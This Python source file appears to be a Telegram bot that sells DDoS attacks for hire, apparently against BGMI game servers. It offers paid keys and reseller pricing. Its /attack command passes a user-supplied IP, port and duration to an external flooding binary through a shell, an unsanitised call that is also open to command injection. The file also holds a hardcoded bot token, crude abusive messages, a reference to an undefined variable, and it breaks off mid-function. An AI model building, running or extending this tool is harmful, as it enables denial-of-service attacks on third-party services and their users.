import os
import json
import time
import telebot
import datetime
import subprocess
import threading
import signal
import sys
from dateutil.relativedelta import relativedelta
import pytz
import shutil
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import re
import hashlib
import random

# Set Indian Standard Time (IST) timezone
IST = pytz.timezone('Asia/Kolkata')

# Telegram bot token (replace with environment variable or secure config in production)
BOT_TOKEN = '8147615549:AAGW6usLYzRZzaNiDf2b0NEDM0ZaVa6qZ7E'  # Move to env var in production
bot = telebot.TeleBot(BOT_TOKEN)

# Configure retries for Telegram API requests
session = requests.Session()
retries = Retry(total=5, backoff_factor=1, status_forcelist=[429, 500, 502, 503, 504])
session.mount('https://', HTTPAdapter(max_retries=retries))
bot.session = session

# Overlord IDs and usernames
overlord_id = {"1807014348", "6258297180"}
overlord_usernames = {"@sadiq9869", "@rahul_618"}

# Dynamic admin IDs and usernames
admin_id = set()
admin_usernames = set()

# Files and backup directory
DATA_DIR = "data"
BACKUP_DIR = os.path.join(DATA_DIR, "backups")
USER_FILE = os.path.join(DATA_DIR, "users.json")
KEY_FILE = os.path.join(DATA_DIR, "keys.json")
RESELLERS_FILE = os.path.join(DATA_DIR, "resellers.json")
AUTHORIZED_USERS_FILE = os.path.join(DATA_DIR, "authorized_users.json")
LOG_FILE = os.path.join(DATA_DIR, "log.txt")
BLOCK_ERROR_LOG = os.path.join(DATA_DIR, "block_error_log.txt")
COOLDOWN_FILE = os.path.join(DATA_DIR, "cooldown.json")
ADMIN_FILE = os.path.join(DATA_DIR, "admins.json")
FEEDBACK_FILE = os.path.join(DATA_DIR, "feedbacks.json")
MAX_BACKUPS = 5

# Track active chats for shutdown messages
active_chats = set()

# Per key cost for resellers
KEY_COST = {"1min": 5, "1h": 10, "1d": 100, "7d": 450, "1m": 900}

# In-memory storage
users = {}
keys = {}
authorized_users = {}
last_attack_time = {}
active_attacks = {}
COOLDOWN_PERIOD = 0
resellers = {}
feedbacks = {}

# Stats tracking
bot_start_time = datetime.datetime.now(IST)
stats = {
    "total_keys": 0,
    "active_attacks": 0,
    "total_users": set(),
    "active_users": [],
    "key_gen_timestamps": [],
    "redeemed_keys": 0,
    "total_attacks": 0,
    "attack_durations": [],
    "expired_keys": 0,
    "peak_active_users": 0,
    "total_feedbacks": 0,
    "command_usage": {
        "start": 0, "help": 0, "genkey": 0, "attack": 0,
        "listkeys": 0, "myinfo": 0, "redeem": 0, "stats": 0,
        "addadmin": 0, "removeadmin": 0, "checkadmin": 0,
        "addreseller": 0, "balance": 0, "block": 0, "add": 0,
        "logs": 0, "users": 0, "remove": 0, "resellers": 0,
        "addbalance": 0, "removereseller": 0, "setcooldown": 0,
        "checkcooldown": 0, "feedback": 0
    }
}

# Compulsory message
COMPULSORY_MESSAGE = (
    "━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    "<b><i>🔥 SCAM ALERT! 🔥</i></b>\n"
    "<b><i>Agar koi bhi Rahul DDoS bot ka key kisi aur se kharidta hai, toh kisi bhi scam ka koi responsibility nahi! 😡</i></b>\n"
    "<b><i>✅ Sirf @Rahul_618 se key lo – yeh hai Trusted Dealer! 💎</i></b>\n"
    "<b><i>Any problem? Contact @Rahul_618! 📩</i></b>\n"
    "━━━━━━━━━━━━━━━━━━━━━━━━━"
)

# Shutdown message
shutdown_message = (
    "<b><i>💥 Oye bhaiyo aur behno, *SupremeBot* abhi thodi der ke liye *bandh* ho raha hai! 🛑 "
    "System ko *gaand phaad* wala upgrade ka *missile booster* lag raha hai! 🚀<br><br>"
    "🔥 Agli baar jab lautega na, to maa kasam — ek-ek gaand phaad daga command mein aag laga dega! 🎇 "
    "Har *move* mein tumhari *gaand* ko *atom bomb* se udaa dega! 💣 "
    "Overlord ji *@sadiq9869* ke hukum se isko itna *bhaukal* bana diya jayega ki server ki *chut* se *khoon* tapkega! 😈<br><br>"
    "😏 Soch rahe ho bot chala gaya? Bhan ka lauda! Yeh toh bas trailer tha, abhe to baki bot ki chut sa khoon nikaal na baki ha! 🍿 "
    "Yeh koi *chintu-mintu* bot nahi, yeh Overlord ka *nuclear missile* hai jo sabki *gaand* ek saath phaad deta hai! ☢️<br><br>"
    "⚡ Soch rahe ho chala gaya? Bhan ka lauda, comeback aisa hoga ki server ki chut se khoon tapkega!🪓 "
    "Tab tak *chup-chaap* apni *aukaat* mein raho, *gaand mein ungli* karke dekho toh wapas aate hi poora *khaandaan* hila denge! 😎 "
    "Overlord ji bolega, “Abe iska *khoon* nikalna chahiye tha, shabashi danga mujh balka!” <br><br>"
    "👑 *SupremeBot* Overlord ke *ma overlord ji ka control ma hu agar nahi hota to pura tg ki maa chod data 😈☠️ "
    "Abhi ke liye apne *dil* thham lo aur ma the supremebot jaldi wapas aane ka intezaar karo!🏴‍☠️</i></b>"
)

# Cyberpunk quotes for UI flair
CYBERPUNK_QUOTES = [
    "Hack the planet, bhai! 🌌",
    "Neon nights, cosmic fights! ⚡️",
    "Code is power, unleash the dhamaka! 💥",
    "Overlord vibes, rule the digital jungle! 😎",
    "No rules, just pure cyber masti! 🚀"
]

def initialize_system():
    if not os.path.exists(DATA_DIR):
        os.makedirs(DATA_DIR, 0o755)
    if not os.path.exists(BACKUP_DIR):
        os.makedirs(BACKUP_DIR, 0o755)
    for file in [USER_FILE, KEY_FILE, RESELLERS_FILE, AUTHORIZED_USERS_FILE, LOG_FILE, BLOCK_ERROR_LOG, COOLDOWN_FILE, ADMIN_FILE, FEEDBACK_FILE]:
        if not os.path.exists(file):
            if file.endswith(".json"):
                with open(file, 'w', encoding='utf-8') as f:
                    if file == COOLDOWN_FILE:
                        json.dump({"cooldown": 0}, f)
                    elif file == ADMIN_FILE:
                        json.dump({"ids": [], "usernames": []}, f)
                    elif file == FEEDBACK_FILE:
                        json.dump({}, f)
                    else:
                        json.dump({}, f)
            else:
                open(file, 'a', encoding='utf-8').close()

def reset_json_file(file_path, default_data):
    with open(file_path, 'w', encoding='utf-8') as f:
        json.dump(default_data, f, indent=4)
    log_action("SYSTEM", "SYSTEM", "Reset JSON File", f"File: {file_path}, Reset to: {default_data}", "File reset due to corruption")

def load_data():
    global users, keys, authorized_users, resellers, admin_id, admin_usernames, feedbacks, COOLDOWN_PERIOD
    initialize_system()
    max_retries = 3
    retry_count = 0

    # Restore from latest backup on startup
    restore_from_backup()

    while retry_count < max_retries:
        try:
            for file in [USER_FILE, AUTHORIZED_USERS_FILE, KEY_FILE, RESELLERS_FILE, COOLDOWN_FILE, ADMIN_FILE, FEEDBACK_FILE]:
                with open(file, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    if not isinstance(data, dict):
                        log_action("SYSTEM", "SYSTEM", "Load Data Error", f"File: {file}, Invalid data type: {type(data)}", "Resetting file")
                        reset_json_file(file, {})
                        data = {}
                    if file == USER_FILE:
                        for uid, info in list(data.items()):
                            try:
                                exp_date = datetime.datetime.strptime(info['expiration'], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
                                if datetime.datetime.now(IST) > exp_date:
                                    del data[uid]
                                    stats["expired_keys"] += 1
                                else:
                                    data[uid] = info
                                    stats["total_users"].add(uid)
                            except (ValueError, KeyError):
                                del data[uid]
                        users = data
                    elif file == AUTHORIZED_USERS_FILE:
                        authorized_users = data
                    elif file == KEY_FILE:
                        for key_name, key_info in list(data.items()):
                            generated_time = datetime.datetime.strptime(key_info["generated_time"], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
                            minutes, hours, days, months = parse_duration(key_info["duration"])
                            expiration_time = generated_time + relativedelta(months=months, days=days, hours=hours, minutes=minutes)
                            if datetime.datetime.now(IST) > expiration_time and not key_info.get("blocked", False):
                                del data[key_name]
                                stats["expired_keys"] += 1
                            else:
                                data[key_name] = key_info
                                stats["total_keys"] += 1
                                stats["key_gen_timestamps"].append(generated_time)
                        keys = data
                    elif file == RESELLERS_FILE:
                        resellers = data
                    elif file == COOLDOWN_FILE:
                        COOLDOWN_PERIOD = data.get("cooldown", 0)
                    elif file == ADMIN_FILE:
                        admin_id = set(data.get("ids", []))
                        admin_usernames = set(data.get("usernames", []))
                    elif file == FEEDBACK_FILE:
                        feedbacks = data
                        stats["total_feedbacks"] = sum(len(fb) for fb in feedbacks.values())
            print(f"Data loaded successfully. Keys: {list(keys.keys())}, Admins: {admin_id}")
            break
        except (FileNotFoundError, json.JSONDecodeError) as e:
            retry_count += 1
            log_action("SYSTEM", "SYSTEM", "Load Data Error", f"Error: {str(e)}, Retry: {retry_count}/{max_retries}", "Attempting to restore from backup")
            restore_from_backup()
            if retry_count == max_retries:
                log_action("SYSTEM", "SYSTEM", "Load Data Failure", f"Error: {str(e)}, Max retries reached", "Resetting all files to Sea_default")
                reset_json_file(USER_FILE, {})
                reset_json_file(AUTHORIZED_USERS_FILE, {})
                reset_json_file(KEY_FILE, {})
                reset_json_file(RESELLERS_FILE, {})
                reset_json_file(COOLDOWN_FILE, {"cooldown": 0})
                reset_json_file(ADMIN_FILE, {"ids": [], "usernames": []})
                reset_json_file(FEEDBACK_FILE, {})
                users = {}
                authorized_users = {}
                keys = {}
                resellers = {}
                feedbacks = {}
                COOLDOWN_PERIOD = 0
                admin_id = set()
                admin_usernames = set()
                print("Max retries reached, reset all data to default.")
                break

def save_data():
    try:
        with open(USER_FILE, 'w', encoding='utf-8') as f:
            json.dump(users, f, indent=4)
        with open(AUTHORIZED_USERS_FILE, 'w', encoding='utf-8') as f:
            json.dump(authorized_users, f, indent=4)
        with open(KEY_FILE, 'w', encoding='utf-8') as f:
            json.dump(keys, f, indent=4)
        with open(RESELLERS_FILE, 'w', encoding='utf-8') as f:
            json.dump(resellers, f, indent=4)
        with open(COOLDOWN_FILE, 'w', encoding='utf-8') as f:
            json.dump({"cooldown": COOLDOWN_PERIOD}, f, indent=4)
        with open(ADMIN_FILE, 'w', encoding='utf-8') as f:
            json.dump({"ids": list(admin_id), "usernames": list(admin_usernames)}, f, indent=4)
        with open(FEEDBACK_FILE, 'w', encoding='utf-8') as f:
            json.dump(feedbacks, f, indent=4)
        print("All data saved successfully.")
    except PermissionError as e:
        log_action("SYSTEM", "SYSTEM", "Save Data Error", f"Permission denied: {str(e)}", "Check file permissions")

def create_backup():
    backup_time = datetime.datetime.now(IST).strftime('%Y-%m-%d_%I-%M-%S_%p')
    backup_dir = os.path.join(BACKUP_DIR, f"backup_{backup_time}")
    os.makedirs(backup_dir, 0o755)
    for file in [USER_FILE, KEY_FILE, RESELLERS_FILE, AUTHORIZED_USERS_FILE, COOLDOWN_FILE, LOG_FILE, BLOCK_ERROR_LOG, ADMIN_FILE, FEEDBACK_FILE]:
        if os.path.exists(file):
            shutil.copy2(file, os.path.join(backup_dir, os.path.basename(file)))
    backups = [d for d in os.listdir(BACKUP_DIR) if d.startswith("backup_")]
    if len(backups) > MAX_BACKUPS:
        oldest_backup = min(backups, key=lambda x: os.path.getctime(os.path.join(BACKUP_DIR, x)))
        shutil.rmtree(os.path.join(BACKUP_DIR, oldest_backup))
    log_action("SYSTEM", "SYSTEM", "Backup Created", f"Backup directory: {backup_dir}", "Backup created successfully")

def restore_from_backup():
    backups = [d for d in os.listdir(BACKUP_DIR) if d.startswith("backup_")]
    if backups:
        latest_backup = max(backups, key=lambda x: os.path.getctime(os.path.join(BACKUP_DIR, x)))
        backup_path = os.path.join(BACKUP_DIR, latest_backup)
        for file in [USER_FILE, KEY_FILE, RESELLERS_FILE, AUTHORIZED_USERS_FILE, COOLDOWN_FILE, LOG_FILE, BLOCK_ERROR_LOG, ADMIN_FILE, FEEDBACK_FILE]:
            src = os.path.join(backup_path, os.path.basename(file))
            if os.path.exists(src):
                shutil.copy2(src, file)
        log_action("SYSTEM", "SYSTEM", "Restore Backup", f"Restored from: {backup_path}", "Backup restored successfully")
    else:
        log_action("SYSTEM", "SYSTEM", "Restore Backup", "No backups found", "Failed to restore, no backups available")

def send_shutdown_message():
    for chat_id in active_chats:
        try:
            bot.send_message(chat_id, shutdown_message, parse_mode="HTML")
        except Exception as e:
            log_error(f"Failed to send shutdown message to {chat_id}: {str(e)}", "system", "system")

def signal_handler(sig, frame):
    print("\nCtrl+C detected, initiating shutdown...")
    create_backup()  # Create backup before shutdown
    send_shutdown_message()  # Send shutdown message to all active chats
    bot.stop_polling()
    print("Bot shutdown complete.")
    sys.exit(0)

def is_overlord(user_id, username=None):
    username = username.lower() if username else None
    return (str(user_id) in overlord_id or username in overlord_usernames)

def is_admin(user_id, username=None):
    username = username.lower() if username else None
    return (str(user_id) in admin_id or username in admin_usernames or is_overlord(user_id, username))

def has_valid_context(user_id, chat_type):
    if user_id in users:
        try:
            user_info = users[user_id]
            exp_date = datetime.datetime.strptime(user_info['expiration'], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
            if datetime.datetime.now(IST) < exp_date:
                return user_info.get('context') == chat_type
        except (ValueError, KeyError):
            return False
    return False

def append_compulsory_message(response):
    return f"{response}\n\n{COMPULSORY_MESSAGE}"

def safe_reply(bot, message, text):
    try:
        text_with_compulsory = append_compulsory_message(text)
        if len(text_with_compulsory) > 4096:
            chunks = [text_with_compulsory[i:i+4096] for i in range(0, len(text_with_compulsory), 4096)]
            for chunk in chunks:
                bot.send_message(message.chat.id, chunk, parse_mode="HTML")
        else:
            bot.send_message(message.chat.id, text_with_compulsory, parse_mode="HTML")
        active_chats.add(message.chat.id)
    except telebot.apihelper.ApiTelegramException as e:
        if "message to be replied not found" in str(e):
            with open("error_log.txt", "a", encoding='utf-8') as log_file:
                log_file.write(f"[{datetime.datetime.now(IST)}] ChatID: {message.chat.id}, Error: {str(e)}\n")
            bot.send_message(message.chat.id, append_compulsory_message(text), parse_mode="HTML")
        else:
            log_error(f"Error in safe_reply: {str(e)}", message.from_user.id, message.from_user.username)

def log_action(user_id, username, command, details="", response="", error=""):
    username = username or f"UserID_{user_id}"
    timestamp = datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')
    log_entry = (
        f"Timestamp: {timestamp}\n"
        f"UserID: {user_id}\n"
        f"Username: @{username}\n"
        f"Command: {command}\n"
        f"Details: {details}\n"
        f"Response: {response}\n"
    )
    if error:
        log_entry += f"Error: {error}\n"
    log_entry += "----------------------------------------\n"
    with open(LOG_FILE, "a", encoding='utf-8') as file:
        file.write(log_entry)

def log_error(error_message, user_id, username):
    username = username or f"UserID_{user_id}"
    timestamp = datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')
    log_entry = (
        f"Timestamp: {timestamp}\n"
        f"UserID: {user_id}\n"
        f"Username: @{username}\n"
        f"Error: {error_message}\n"
        "----------------------------------------\n"
    )
    with open(LOG_FILE, "a", encoding='utf-8') as file:
        file.write(log_entry)

def set_cooldown(seconds):
    global COOLDOWN_PERIOD
    COOLDOWN_PERIOD = max(0, seconds)  # Ensure non-negative
    with open(COOLDOWN_FILE, "w", encoding='utf-8') as file:
        json.dump({"cooldown": COOLDOWN_PERIOD}, file)

def parse_duration(duration_str):
    duration_str = duration_str.lower().replace("minutes", "min").replace("hours", "h").replace("days", "d").replace("months", "m")
    match = re.match(r"(\d+)([minhdm])", duration_str)
    if not match:
        return None, None, None, None
    value = int(match.group(1))
    unit = match.group(2)
    if unit == "min":
        if value < 1 or value > 59:
            return None, None, None, None
        return value, 0, 0, 0
    elif unit == "h":
        return 0, value, 0, 0
    elif unit == "d":
        return 0, 0, value, 0
    elif unit == "m":
        return 0, 0, 0, value
    return None, None, None, None

def add_time_to_current_date(years=0, months=0, days=0, hours=0, minutes=0, seconds=0):
    current_time = datetime.datetime.now(IST)
    new_time = current_time + relativedelta(years=years, months=months, days=days, hours=hours, minutes=minutes, seconds=seconds)
    return new_time

def hash_feedback(feedback_text="", media_file_id=""):
    return hashlib.md5((feedback_text + media_file_id).encode()).hexdigest()

def has_submitted_feedback(user_id, attack_id):
    return str(user_id) in feedbacks and attack_id in feedbacks[str(user_id)]

def is_duplicate_feedback(user_id, feedback_text, media_file_id):
    feedback_hash = hash_feedback(feedback_text, media_file_id)
    if str(user_id) in feedbacks:
        for attack_id, feedback in feedbacks[str(user_id)].items():
            if feedback["hash"] == feedback_hash:
                return True
    return False

def save_feedback(user_id, attack_id, feedback_text, media_file_id, chat_type):
    feedback_hash = hash_feedback(feedback_text, media_file_id)
    timestamp = datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')
    if str(user_id) not in feedbacks:
        feedbacks[str(user_id)] = {}
    feedbacks[str(user_id)][attack_id] = {
        "feedback_text": feedback_text,
        "media_file_id": media_file_id,
        "timestamp": timestamp,
        "hash": feedback_hash,
        "chat_type": chat_type
    }
    stats["total_feedbacks"] += 1
    save_data()

def calculate_uptime():
    uptime = datetime.datetime.now(IST) - bot_start_time
    days = uptime.days
    hours, remainder = divmod(uptime.seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{days}d {hours}h {minutes}m {seconds}s"

def calculate_keys_per_minute():
    current_time = datetime.datetime.now(IST)
    one_minute_ago = current_time - datetime.timedelta(minutes=1)
    recent_keys = [ts for ts in stats["key_gen_timestamps"] if ts >= one_minute_ago]
    return len(recent_keys)

def calculate_avg_attack_duration():
    if not stats["attack_durations"]:
        return "0s"
    avg_duration = sum(stats["attack_durations"]) / len(stats["attack_durations"])
    return f"{int(avg_duration)}s"

def update_active_users():
    current_time = datetime.datetime.now(IST)
    stats["active_users"] = [user for user in stats["active_users"] if (current_time - user["last_active"]).total_seconds() < 300]
    return len(stats["active_users"])

def live_stats_update(chat_id, message_id):
    last_message_id = message_id
    while True:
        try:
            active_users = update_active_users()
            active_keys = len([key for key, info in keys.items() if not info.get("blocked", False) and (datetime.datetime.now(IST) - datetime.datetime.strptime(info["generated_time"], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)).total_seconds() < sum(parse_duration(info["duration"])[:3]) * 60])
            command_usage_str = "\n".join([f"<b><i>📜 /{cmd}: {count}</i></b>" for cmd, count in stats["command_usage"].items()])
            memory_usage = len(keys) * 0.1 + len(users) * 0.05 + len(resellers) * 0.02 + len(feedbacks) * 0.03
            latest_feedback = max([fb["timestamp"] for user_feedbacks in feedbacks.values() for fb in user_feedbacks.values()], default="None")
            response = (
                f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"<b><i>🌌 COSMIC LIVE STATS (OVERLORD) 🌌</i></b>\n"
                f"<b><i>🔥 Bhai Overlord, yeh hai live data ka dhamaka! 🔥</i></b>\n"
                f"<b><i>🔑 Total Keys Generated: {stats['total_keys']}</i></b>\n"
                f"<b><i>💥 Active Attacks Running: {stats['active_attacks']}</i></b>\n"
                f"<b><i>👥 Total Registered Users: {len(stats['total_users'])}</i></b>\n"
                f"<b><i>👤 Active Users (Last 5 min): {active_users}</i></b>\n"
                f"<b><i>🔑 Keys Generated/min: {calculate_keys_per_minute()}</i></b>\n"
                f"<b><i>🔓 Total Redeemed Keys: {stats['redeemed_keys']}</i></b>\n"
                f"<b><i>⏳ Bot Uptime: {calculate_uptime()}</i></b>\n"
                f"<b><i>💥 Total Attacks Launched: {stats['total_attacks']}</i></b>\n"
                f"<b><i>⏱️ Avg Attack Duration: {calculate_avg_attack_duration()}</i></b>\n"
                f"<b><i>❌ Total Expired Keys: {stats['expired_keys']}</i></b>\n"
                f"<b><i>🔑 Active Keys: {active_keys}</i></b>\n"
                f"<b><i>👥 Peak Active Users: {stats['peak_active_users']}</i></b>\n"
                f"<b><i>📝 Total Feedbacks: {stats['total_feedbacks']}</i></b>\n"
                f"<b><i>📅 Latest Feedback: {latest_feedback}</i></b>\n"
                f"<b><i>⚙️ Memory Usage (Simulated): {memory_usage:.2f}MB</i></b>\n"
                f"<b><i>📊 Command Usage Stats:</i></b>\n{command_usage_str}\n"
                f"<b><i>📅 Last Updated: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
                f"<b><i>💾 Data Backup: {os.path.exists(BACKUP_DIR)}</i></b>\n"
                f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
                f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━"
            )
            try:
                bot.edit_message_text(append_compulsory_message(response), chat_id, last_message_id, parse_mode="HTML")
            except telebot.apihelper.ApiTelegramException as e:
                if "message to edit not found" in str(e) or "bad request" in str(e).lower():
                    new_message = bot.send_message(chat_id, append_compulsory_message(response), parse_mode="HTML")
                    last_message_id = new_message.message_id
                else:
                    log_error(f"Stats update error: {str(e)}", "system", "system")
                    break
            time.sleep(10)
        except Exception as e:
            log_error(f"Stats update critical error: {str(e)}", "system", "system")
            time.sleep(10)

def execute_attack(target, port, time, chat_id, username, last_attack_time, user_id, attack_id):
    if active_attacks.get(user_id, False):
        response = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b><i>🚫 BSDK, ruk ja warna gaand mar dunga teri!</i></b>\n"
            f"<b><i>Ek attack chal raha hai, dusra mat try kar!</i></b>\n"
            f"<b><i>Details: UserID: {user_id}, Username: @{username}</i></b>\n"
            f"<b><i>Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
            f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
            f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━"
        ) if not is_admin(user_id, username) else (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b><i>👑 Kripya karke BGMI ko tazi sa na choda!</i></b>\n"
            f"<b><i>Ek attack already chal raha hai, wait karo.</i></b>\n"
            f"<b><i>Details: UserID: {user_id}, Username: @{username}</i></b>\n"
            f"<b><i>Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
            f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
            f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/attack", f"Target: {target}, Port: {port}, Time: {time}", response)
        return
    try:
        if not os.path.exists("./Rohan") or not os.access("./Rohan", os.X_OK):
            response = (
                f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"<b><i>❌ Error: ./Rohan binary missing or not executable!</i></b>\n"
                f"<b><i>Please ensure ./Rohan exists and run 'chmod +x ./Rohan'.</i></b>\n"
                f"<b><i>Details: UserID: {user_id}, Username: @{username}</i></b>\n"
                f"<b><i>Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
                f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
                f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━"
            )
            safe_reply(bot, message, response)
            log_action(user_id, username, "/attack", f"Target: {target}, Port: {port}, Time: {time}", response)
            return
        packet_size = 512
        full_command = f"./Rohan {target} {port} {time} {packet_size} 1200"
        response = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b><i>💥 Attack Sent Successfully! 💥</i></b>\n"
            f"<b><i>🎯 Target: {target}:{port}</i></b>\n"
            f"<b><i>⏳ Duration: {time} seconds</i></b>\n"
            f"<b><i>📦 Packet Size: {packet_size} bytes</i></b>\n"
            f"<b><i>🔥 Threads: 1200</i></b>\n"
            f"<b><i>👤 Attacker: @{username} (UserID: {user_id})</i></b>\n"
            f"<b><i>🆔 Attack ID: {attack_id}</i></b>\n"
            f"<b><i>📍 Chat Type: {'Group' if bot.get_chat(chat_id).type in ['group', 'supergroup'] else 'DM'}</i></b>\n"
            f"<b><i>📝 Feedback Required: Use /feedback {attack_id} <your_feedback> after attack completes.</i></b>\n"
            f"<b><i>🔗 Join VIP DDoS: https://t.me/devil_ddos</i></b>\n"
            f"<b><i>📅 Launched: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
            f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
            f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        safe_reply(bot, message, response)
        subprocess.Popen(full_command, shell=True)
        threading.Timer(time, lambda: send_attack_finished_message(chat_id, attack_id, user_id, username, last_attack_time), []).start()
        active_attacks[user_id] = True
        stats["active_attacks"] += 1
        stats["total_attacks"] += 1
        stats["attack_durations"].append(time)
        log_action(user_id, username, "/attack", f"Target: {target}, Port: {port}, Time: {time}, Packet Size: {packet_size}, Threads: 1200, Attack ID: {attack_id}", response)
    except Exception as e:
        response = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b><i>❌ Error executing attack: {str(e)}</i></b>\n"
            f"<b><i>Details: UserID: {user_id}, Username: @{username}</i></b>\n"
            f"<b><i>Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
            f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
            f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/attack", f"Target: {target}, Port: {port}, Time: {time}, Attack ID: {attack_id}", response, str(e))
    finally:
        if user_id in active_attacks:
            del active_attacks[user_id]
            stats["active_attacks"] -= 1

def send_attack_finished_message(chat_id, attack_id, user_id, username, last_attack_time):
    chat_type = 'group' if bot.get_chat(chat_id).type in ['group', 'supergroup'] else 'private'
    last_attack_time[user_id] = datetime.datetime.now(IST)
    if not is_overlord(user_id, username):
        feedback_message = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b><i>✅ Attack {attack_id} Completed!</i></b>\n"
            f"<b><i>👤 User: @{username} (UserID: {user_id})</i></b>\n"
            f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
            f"<b><i>📝 {'Submit feedback using /feedback ' + attack_id + ' <your_feedback> to launch another attack.' if chat_type == 'group' else 'Feedback appreciated! Use /feedback ' + attack_id + ' <your_feedback> (optional).'}</i></b>\n"
            f"<b><i>⏳ Cooldown: Wait {COOLDOWN_PERIOD} seconds before next attack!</i></b>\n"
            f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
            f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
            f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        bot.send_message(chat_id, feedback_message, parse_mode="HTML")
    else:
        bot.send_message(chat_id, (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b><i>👑 Attack {attack_id} Completed, Overlord ji!</i></b>\n"
            f"<b><i>🙌 No feedback or cooldown needed, aap toh boss ho!</i></b>\n"
            f"<b><i>👤 User: @{username} (UserID: {user_id})</i></b>\n"
            f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
            f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
            f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━"
        ), parse_mode="HTML")

# Command handlers
@bot.message_handler(commands=['help'])
def help_command(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["command_usage"]["help"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    chat_type = 'group' if message.chat.type in ['group', 'supergroup'] else 'private'

    commands = (
        "<b><i>🌌 Available Commands 🌌</i></b>\n"
        "<b><i>/start - Start the cosmic journey</i></b>\n"
        "<b><i>/help - Show this help menu</i></b>\n"
        "<b><i>/attack <ip> <port> <time> - Launch a DDoS attack</i></b>\n"
        "<b><i>/feedback <attack_id> <feedback> - Submit attack feedback</i></b>\n"
    )
    if is_admin(user_id, username):
        commands += (
            "<b><i>/add <user_id> - Authorize a user</i></b>\n"
            "<b><i>/remove <user_id> - Remove a user</i></b>\n"
            "<b><i>/block <key> - Block a key</i></b>\n"
            "<b><i>/logs - View recent logs</i></b>\n"
            "<b><i>/users - List all users</i></b>\n"
            "<b><i>/resellers - List all resellers</i></b>\n"
            "<b><i>/setcooldown <seconds> - Set attack cooldown</i></b>\n"
            "<b><i>/checkcooldown - Check current cooldown</i></b>\n"
        )
    if is_overlord(user_id, username):
        commands += (
            "<b><i>/addreseller <user_id> - Add a reseller</i></b>\n"
            "<b><i>/addbalance <user_id> <amount> - Add reseller balance</i></b>\n"
            "<b><i>/removereseller <user_id> - Remove a reseller</i></b>\n"
        )

    response = (
        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"<b><i>🌌 COSMIC HELP MENU 🌌</i></b>\n"
        f"<b><i>🔥 Bhai, yeh hai commands ka dhamaka! 🔥</i></b>\n"
        f"{commands}\n"
        f"<b><i>👤 User: @{username} (UserID: {user_id})</i></b>\n"
        f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
        f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
        f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
